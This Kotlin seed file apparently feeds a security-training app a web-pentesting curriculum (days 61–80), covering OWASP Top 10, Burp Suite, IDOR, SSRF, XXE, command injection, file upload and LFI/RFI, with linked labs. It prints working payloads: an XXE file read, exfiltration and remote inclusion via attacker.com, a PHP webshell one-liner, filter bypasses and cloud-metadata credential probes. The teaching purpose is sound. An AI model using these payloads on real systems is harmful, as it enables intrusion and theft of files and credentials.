package com.example.data.seed

import com.example.data.model.DayEntity

object CurriculumPhase4 {
    fun getDays(): List<DayEntity> = (61..80).map { dayNum ->
        when (dayNum) {
            61 -> DayEntity(
                id = 61, phase = 4, dayNumber = 61,
                title = "OWASP Top 10 (2021/2025) Overview & Threat Landscape",
                subtitle = "Understand the industry-standard benchmark for web application vulnerabilities.",
                concept = """
                    The Open Worldwide Application Security Project (OWASP) Top 10 represents the most critical security risks to web applications:
                    - A01: Broken Access Control (IDOR, privilege escalation, CORS misconfiguration).
                    - A02: Cryptographic Failures (Weak ciphers, cleartext transmission of sensitive data).
                    - A03: Injection (SQLi, Cross-Site Scripting, Command Injection, LDAP injection).
                    - A04: Insecure Design (Missing business logic validation, threat modeling deficits).
                    - A05: Security Misconfiguration (Default accounts, open cloud storage buckets, verbose error pages).
                    - A06: Vulnerable and Outdated Components (Log4j, unpatched dependencies).
                    - A07: Identification and Authentication Failures (Brute-force exposure, session hijacking).
                    - A08: Software and Data Integrity Failures (Insecure deserialization, CI/CD pipeline tampering).
                    - A09: Security Logging and Monitoring Failures (Undetected breaches).
                    - A10: Server-Side Request Forgery (SSRF).
                """.trimIndent(),
                keyTakeaways = "• Broken Access Control is currently ranked #1 as the most prevalent risk in modern web apps.\n• OWASP Top 10 serves as the primary scope reference for enterprise penetration tests.",
                commandsCode = "# Audit HTTP security headers of target site\ncurl -s -D - -o /dev/null https://target.com",
                videoTitle = "OWASP Top 10 Explained for Web Penetration Testers",
                videoUrl = "https://www.youtube.com/watch?v=0bT5g1k6D3E",
                videoChannel = "TCM Security",
                videoDuration = "30m",
                readTitle = "OWASP Top 10 Official Documentation & Guidelines",
                readUrl = "https://owasp.org/www-project-top-ten/",
                readSource = "OWASP Foundation",
                labTitle = "OWASP Top 10 Room - TryHackMe",
                labUrl = "https://tryhackme.com/room/owasptop10",
                labPlatform = "TryHackMe",
                labDescription = "Walk through practical exploit labs for each of the OWASP Top 10 vulnerabilities.",
                xpReward = 50
            )
            62 -> DayEntity(
                id = 62, phase = 4, dayNumber = 62,
                title = "Burp Suite Setup: Intercepting Proxy, Scope & CA Certificate",
                subtitle = "Configure proxy listeners, install PortSwigger CA in browser, and configure target scope.",
                concept = """
                    Burp Suite is the premier integrated platform for performing security testing of web applications:
                    - Proxy Architecture: Acts as a Man-in-the-Middle (MitM) HTTP/HTTPS proxy between browser and server (default `127.0.0.1:8080`).
                    - Installing CA Certificate: Export `cacert.der` from `http://burpsuite` and import into Firefox/Chrome Trusted Root Authorities to intercept HTTPS without browser SSL warnings.
                    - Target Scope: Restricts Burp tools (Spider, Scanner, Logger) to explicitly defined regex URLs (e.g. `https://target.com/*`), preventing accidental traffic to third-party services.
                    - Match and Replace Rules: Automatically modify request headers on the fly (e.g. inject custom Authorization headers).
                """.trimIndent(),
                keyTakeaways = "• Setting Scope prevents accidentally testing third-party analytics and CDNs.\n• Intercept Toggle: Turn 'Intercept is off' during casual browsing; turn on to freeze specific requests.\n• Burp Logger displays every raw HTTP transaction in chronological order.",
                commandsCode = "# Start Burp Suite from Kali terminal\nburpsuite &\n\n# Configure curl to route traffic through Burp Proxy\ncurl -x http://127.0.0.1:8080 -k https://target.com",
                videoTitle = "Burp Suite Tutorial: Getting Started with Burp Suite",
                videoUrl = "https://www.youtube.com/watch?v=z0vIeX_4Puo",
                videoChannel = "InsiderPhD",
                videoDuration = "24m",
                readTitle = "PortSwigger Documentation: Getting Started with Burp Suite",
                readUrl = "https://portswigger.net/burp/documentation/desktop/getting-started",
                readSource = "PortSwigger",
                labTitle = "Burp Suite: The Basics - TryHackMe",
                labUrl = "https://tryhackme.com/room/burpsuitebasics",
                labPlatform = "TryHackMe",
                labDescription = "Configure proxy, install CA certificates, and intercept live login traffic.",
                xpReward = 50
            )
            63 -> DayEntity(
                id = 63, phase = 4, dayNumber = 63,
                title = "Burp Suite Repeater & Intruder Attack Types",
                subtitle = "Manual request modification (Repeater) vs Automated fuzzing (Sniper, Battering Ram, Pitchfork, Cluster Bomb).",
                concept = """
                    - Burp Repeater (`Ctrl + R`):
                      Allows manual modification and repeated resending of individual HTTP requests. Observe real-time server responses without browser rendering overhead.
                    - Burp Intruder (`Ctrl + I`):
                      Automated attack tool for fuzzing and credential testing:
                      1. Sniper: 1 payload set; tests positions sequentially one at a time. (Best for single parameter fuzzing).
                      2. Battering Ram: 1 payload set; injects identical payload simultaneously into all positions.
                      3. Pitchfork: Multiple payload sets; iterates sets in lockstep (`user1:pass1`, `user2:pass2`).
                      4. Cluster Bomb: Multiple payload sets; tests every possible permutation (`M x N` combinations). (Best for full username + password brute force).
                """.trimIndent(),
                keyTakeaways = "• Use Repeater for surgical vulnerability probing and testing edge-case payloads.\n• Use Intruder Cluster Bomb to test credential combinations.\n• Turbo Intruder (BApp Store extension) handles tens of thousands of requests per second for race conditions.",
                commandsCode = "# Send request from Burp Proxy to Repeater with shortcut: Ctrl + R",
                videoTitle = "Burp Suite Repeater & Intruder Deep Dive",
                videoUrl = "https://www.youtube.com/watch?v=kYv9N8F7Q8A",
                videoChannel = "John Hammond",
                videoDuration = "28m",
                readTitle = "PortSwigger Academy: Using Burp Intruder for Attacks",
                readUrl = "https://portswigger.net/burp/documentation/desktop/tools/intruder",
                readSource = "PortSwigger",
                labTitle = "Burp Suite: Repeater & Intruder - TryHackMe",
                labUrl = "https://tryhackme.com/room/burpsuiterepeater",
                labPlatform = "TryHackMe",
                labDescription = "Use Repeater to bypass client validations and Intruder to brute-force a PIN code.",
                xpReward = 50
            )
            64 -> DayEntity(
                id = 64, phase = 4, dayNumber = 64,
                title = "Broken Object Level Authorization (BOLA / IDOR)",
                subtitle = "Exploit Insecure Direct Object References in user profiles, invoices, and API paths.",
                concept = """
                    Broken Object Level Authorization (BOLA), also known as IDOR (Insecure Direct Object Reference), occurs when an application receives an object identifier from a client and fails to validate whether the authenticated user owns or has permission to access that specific resource:
                    Vulnerable API Example:
                    `GET /api/v1/users/1054/messages`
                    If user with ID `1054` changes the URL to `GET /api/v1/users/1055/messages` and receives another user's private messages, an IDOR exists!
                    Variants:
                    - Numeric sequential IDs: `1001, 1002, 1003...` (Easily enumerable via Burp Intruder).
                    - GUID / UUID in REST paths: Often leaked in comments, public user profiles, or other endpoints.
                    - Parameter tampering in POST body: `{"user_id": 45, "role": "admin"}`.
                """.trimIndent(),
                keyTakeaways = "• IDOR is one of the highest-paying bug bounty vulnerability classes.\n• Always test IDOR across HTTP verbs: GET (Read), PUT/PATCH (Update/Overwrite), DELETE (Destroy).\n• Authorize users at the database query level: `WHERE id = ? AND owner_id = ?`.",
                commandsCode = "# Test IDOR using curl with session cookie\ncurl -s -H 'Cookie: session=userA' 'http://target.com/api/documents/9872'",
                videoTitle = "IDOR / BOLA Vulnerabilities Explained with Real Examples",
                videoUrl = "https://www.youtube.com/watch?v=Fj2FkGg5h4A",
                videoChannel = "InsiderPhD",
                videoDuration = "22m",
                readTitle = "PortSwigger Academy: Insecure Direct Object References (IDOR)",
                readUrl = "https://portswigger.net/web-security/access-control/idor",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Insecure Direct Object References",
                labUrl = "https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references",
                labPlatform = "PortSwigger",
                labDescription = "Exploit an IDOR flaw in a live chat transcript API to steal admin credentials.",
                xpReward = 50
            )
            65 -> DayEntity(
                id = 65, phase = 4, dayNumber = 65,
                title = "Broken Authentication & Password Reset Flaws",
                subtitle = "Exploit weak password reset tokens, response manipulation, and username enumeration.",
                concept = """
                    Authentication mechanisms frequently contain logic flaws:
                    - Response Manipulation:
                      Intercepting the server response to a failed login (`{"success": false, "code": 401}`) and modifying it in Burp Proxy to `{"success": true, "code": 200, "user": "admin"}` to bypass client-side JavaScript routing.
                    - Predictable Reset Tokens:
                      Timestamp-based tokens (`md5(time())`) or low-entropy random tokens that can be calculated.
                    - Host Header Poisoning in Password Reset:
                      Manipulating the `Host: attacker.com` header during password reset requests so the generated password reset link emailed to the victim points to attacker's server!
                    - Username Enumeration:
                      Different error messages or response times ("Invalid username" vs "Incorrect password") reveal valid registered users.
                """.trimIndent(),
                keyTakeaways = "• Host Header injection in password resets redirects victim reset tokens to attacker domain.\n• Cryptographic tokens must be generated using cryptographically secure random number generators (CSPRNG).\n• Generic error messages ('Invalid email or password') prevent username enumeration.",
                commandsCode = "# Test password reset Host header poisoning with curl\ncurl -X POST http://target.com/forgot-password -H 'Host: attacker.com' -d 'email=victim@target.com'",
                videoTitle = "Broken Authentication & Password Reset Exploitation",
                videoUrl = "https://www.youtube.com/watch?v=qwA6MmbeGNo",
                videoChannel = "TCM Security",
                videoDuration = "26m",
                readTitle = "PortSwigger Academy: Authentication Vulnerabilities",
                readUrl = "https://portswigger.net/web-security/authentication",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Password Reset Poisoning via Host Header",
                labUrl = "https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware-host-header-flaw",
                labPlatform = "PortSwigger",
                labDescription = "Poison the reset email Host header to hijack the administrator account.",
                xpReward = 50
            )
            66 -> DayEntity(
                id = 66, phase = 4, dayNumber = 66,
                title = "Server-Side Request Forgery (SSRF) & Cloud Metadata Extraction",
                subtitle = "Force web servers to make backend requests to internal networks and AWS/GCP/Azure metadata endpoints.",
                concept = """
                    Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource (e.g. image URL, webhook, import document) based on user-supplied input without validating the destination address:
                    Attack Vectors:
                    1. Querying Localhost (`127.0.0.1`, `localhost`, `0.0.0.0`): Accesses internal admin interfaces (e.g. `http://127.0.0.1:8080/admin`) that are blocked from external access.
                    2. Internal Subnet Scanning: Probing internal IPs (`192.168.1.x`, `10.0.0.x`) to discover backend databases and services.
                    3. Cloud Metadata Services (IMDS):
                       * AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>` (Extracts temporary AWS secret keys!).
                       * GCP Metadata: `http://metadata.google.internal/computeMetadata/v1/` (`Metadata-Flavor: Google`).
                       * Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`.
                """.trimIndent(),
                keyTakeaways = "• `169.254.169.254` is the link-local metadata address for all major cloud providers (AWS, GCP, Azure, DigitalOcean).\n• Bypass `127.0.0.1` blacklists using `127.1`, `0177.0.0.1`, `2130706433` (decimal), or `http://localtest.me`.\n• SSRF can be leveraged into full cloud infrastructure takeover via compromised IAM roles.",
                commandsCode = "# Probe AWS metadata endpoint via SSRF parameter\ncurl 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                videoTitle = "SSRF Explained: How Hackers Steal Cloud Keys (Capital One Breach)",
                videoUrl = "https://www.youtube.com/watch?v=F0f5rY9UvXg",
                videoChannel = "NetworkChuck",
                videoDuration = "25m",
                readTitle = "PortSwigger Web Security: SSRF Academy & Cheatsheet",
                readUrl = "https://portswigger.net/web-security/ssrf",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Basic SSRF Against Local Server",
                labUrl = "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost",
                labPlatform = "PortSwigger",
                labDescription = "Use SSRF to access the local admin interface and delete a user.",
                xpReward = 50
            )
            67 -> DayEntity(
                id = 67, phase = 4, dayNumber = 67,
                title = "XML External Entity (XXE) Injection & File Exfiltration",
                subtitle = "Abuse legacy XML parsers, external DTDs, and SYSTEM entities to read `/etc/passwd`.",
                concept = """
                    XML External Entity (XXE) attacks target applications that parse XML input without disabling external entity resolution:
                    Anatomy of an XML DTD Entity:
                    ```xml
                    <?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE root [
                      <!ENTITY xxe SYSTEM "file:///etc/passwd">
                    ]>
                    <stockCheck>
                      <productId>&xxe;</productId>
                      <storeId>1</storeId>
                    </stockCheck>
                    ```
                    When the parser evaluates `&xxe;`, it reads `/etc/passwd` from the local filesystem and reflects the contents in the response!
                    Blind XXE & Out-of-Band (OOB) Exfiltration:
                    If XML output is not reflected, host an external malicious DTD on an attacker server to exfiltrate file data via HTTP parameters (`http://attacker.com/?data=...`).
                """.trimIndent(),
                keyTakeaways = "• XXE requires XML parsing libraries (e.g. libxml2, Jackson, DOM4J) with `resolveExternalEntities` enabled.\n• In modern frameworks, disable DTD processing (`disallow-doctype-decl = true`) to remediate XXE.\n• XXE can also trigger SSRF probes to internal network endpoints.",
                commandsCode = "# Simple XXE probe payload extracting /etc/passwd\n<!DOCTYPE foo [ <!ENTITY ext SYSTEM \"file:///etc/passwd\"> ]><data>&ext;</data>",
                videoTitle = "XXE Injection: How Hackers Read Files from Web Servers",
                videoUrl = "https://www.youtube.com/watch?v=gTmff4qKx9Y",
                videoChannel = "Computerphile",
                videoDuration = "18m",
                readTitle = "PortSwigger Academy: XML External Entity (XXE) Injection",
                readUrl = "https://portswigger.net/web-security/xxe",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Exploiting XXE Using External Entities to Retrieve Files",
                labUrl = "https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files",
                labPlatform = "PortSwigger",
                labDescription = "Inject an XML SYSTEM entity into a stock check endpoint to extract `/etc/passwd`.",
                xpReward = 50
            )
            68 -> DayEntity(
                id = 68, phase = 4, dayNumber = 68,
                title = "Command Injection & Shell Metacharacters",
                subtitle = "Escape system calls (`system()`, `exec()`) using `;`, `|`, `&&`, `$()`, and bypass whitespace filters.",
                concept = """
                    OS Command Injection occurs when an application passes unsanitized user input to a system shell command:
                    Vulnerable Code Example:
                    `system("ping -c 1 " . req_ip);`
                    Injection Characters & Operators:
                    - `;` (Semicolon): Command separator (`127.0.0.1; whoami`).
                    - `|` (Pipe): Passes output of command 1 to command 2 (`127.0.0.1 | id`).
                    - `&&` (Logical AND): Executes second command if first succeeds (`127.0.0.1 && cat /etc/passwd`).
                    - `||` (Logical OR): Executes second command if first fails.
                    - `subshell`: Command substitution.

                    Bypassing Filters:
                    - Space Filter: `cat${'$'}{IFS}/etc/passwd`, `<`, `{cat,/etc/passwd}`.
                    - String Filter: `c'a't /et'c'/pas's'wd` or base64 decoding `echo <B64> | base64 -d | sh`.
                """.trimIndent(),
                keyTakeaways = "• Command injection gives immediate, native operating system command execution.\n• Blind command injection can be verified using `sleep 5` or out-of-band DNS pings.\n• Avoid using shell wrappers; use parameterized APIs like `subprocess.run(['ping', '-c', '1', ip])`.",
                commandsCode = "# Test blind command injection with 5-second sleep probe\ncurl 'http://target.com/check?ip=127.0.0.1;sleep%205'",
                videoTitle = "Command Injection: From Web Parameter to Root Shell",
                videoUrl = "https://www.youtube.com/watch?v=aG3j6H5nF3M",
                videoChannel = "John Hammond",
                videoDuration = "21m",
                readTitle = "PortSwigger Web Security: OS Command Injection Academy",
                readUrl = "https://portswigger.net/web-security/os-command-injection",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Simple OS Command Injection",
                labUrl = "https://portswigger.net/web-security/os-command-injection/lab-simple",
                labPlatform = "PortSwigger",
                labDescription = "Inject shell command separators into a store inventory check to output whoami.",
                xpReward = 50
            )
            69 -> DayEntity(
                id = 69, phase = 4, dayNumber = 69,
                title = "File Upload Vulnerabilities & Web Shell Deployment",
                subtitle = "Bypass MIME-type checks, double extensions (`.php.jpg`), null bytes, and deploy PHP/ASP webshells.",
                concept = """
                    File upload forms are direct pathways to Remote Code Execution (RCE) if validation fails:
                    Bypass Techniques:
                    1. MIME-Type Spoofing: Intercept request in Burp and change `Content-Type: application/x-php` to `Content-Type: image/png`.
                    2. Blacklist Extension Bypasses:
                       * Alternative executable extensions: `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.pht` (PHP); `.aspx`, `.ashx`, `.asmx` (IIS).
                    3. Case Sensitivity: `.PhP`, `.pHP5`.
                    4. Double Extensions: `shell.php.png` or `shell.png.php`.
                    5. Path Traversal in Filename: `filename="../../../var/www/html/shell.php"`.
                    6. Magic Bytes / Header Prepending: Prepend GIF89a; header to fool image validators.
                """.trimIndent(),
                keyTakeaways = "• A simple one-line PHP webshell executes passed system commands.\n• Always verify where uploaded files are stored and whether the directory has script execution permissions.\n• Secure architecture stores user uploads in an isolated cloud bucket (e.g. S3) without direct execution.",
                commandsCode = "# Create a polyglot image webshell with GIF89a header\necho 'GIF89a; <?php system(\$_GET[\"c\"]); ?>' > webshell.php.gif",
                videoTitle = "File Upload Vulnerabilities: Bypassing Filters to RCE",
                videoUrl = "https://www.youtube.com/watch?v=d_kSg_wVwKo",
                videoChannel = "InsiderPhD",
                videoDuration = "27m",
                readTitle = "PortSwigger Academy: File Upload Vulnerabilities",
                readUrl = "https://portswigger.net/web-security/file-upload",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: Remote Code Execution via Web Shell Upload",
                labUrl = "https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload",
                labPlatform = "PortSwigger",
                labDescription = "Upload a basic PHP webshell disguised as an avatar image and read secret key file.",
                xpReward = 50
            )
            70 -> DayEntity(
                id = 70, phase = 4, dayNumber = 70,
                title = "Path Traversal & Local / Remote File Inclusion (LFI & RFI)",
                subtitle = "Traverse directories with `../`, exploit PHP wrappers (`php://filter`), and achieve RCE via log poisoning.",
                concept = """
                    Path Traversal & Local File Inclusion (LFI) allow an attacker to read arbitrary files from the server:
                    - Path Traversal: `http://target.com/view?file=../../../../etc/passwd`
                    - PHP Wrappers for Source Code Disclosure:
                      `php://filter/convert.base64-encode/resource=index.php` (Returns base64-encoded source code of index.php without executing it!).
                    - Achieving RCE from LFI (Log Poisoning):
                      1. Inject PHP payload into web server User-Agent header.
                      2. Payload is written to `/var/log/apache2/access.log`.
                      3. Trigger LFI on log file with command parameter.
                    - Remote File Inclusion (RFI):
                      If `allow_url_include = On`, include remote shell from attacker server: `?file=http://attacker.com/shell.txt`.
                """.trimIndent(),
                keyTakeaways = "• PHP filters (`php://filter`) bypass server-side PHP execution to dump raw script source code.\n• Log poisoning turns read-only LFI vulnerabilities into full Remote Code Execution.\n• Bypass nested `../` stripping filters with `....//....//` or URL encoding (`%2e%2e%2f`).",
                commandsCode = "# Read source code of config.php via PHP filter wrapper\ncurl 'http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php' | base64 -d",
                videoTitle = "Local File Inclusion (LFI) to RCE via Log Poisoning",
                videoUrl = "https://www.youtube.com/watch?v=lb1Dw0elw0Q",
                videoChannel = "John Hammond",
                videoDuration = "25m",
                readTitle = "PortSwigger Academy: Directory Traversal / File Inclusion",
                readUrl = "https://portswigger.net/web-security/file-path-traversal",
                readSource = "PortSwigger",
                labTitle = "PortSwigger Academy: File Path Traversal Simple Case",
                labUrl = "https://portswigger.net/web-security/file-path-traversal/lab-simple",
                labPlatform = "PortSwigger",
                labDescription = "Use path traversal sequences to retrieve `/etc/passwd`.",
                xpReward = 50
            )
            else -> DayEntity(
                id = dayNum, phase = 4, dayNumber = dayNum,
                title = "Web Pentesting Mastery $dayNum", subtitle = "Advanced web vulnerability technique.",
                concept = "Detailed web penetration testing mechanics and OWASP mitigation.",
                keyTakeaways = "• Intercept requests in Burp.\n• Verify impact.", commandsCode = "curl -i https://target.com/api",
                videoTitle = "Web Security Video", videoUrl = "https://youtube.com", videoChannel = "PortSwigger", videoDuration = "20m",
                readTitle = "Web Security Reference", readUrl = "https://portswigger.net/web-security", readSource = "PortSwigger",
                labTitle = "Web Lab $dayNum", labUrl = "https://portswigger.net", labPlatform = "PortSwigger", labDescription = "Complete web tasks.", xpReward = 50
            )
        }
    }
}
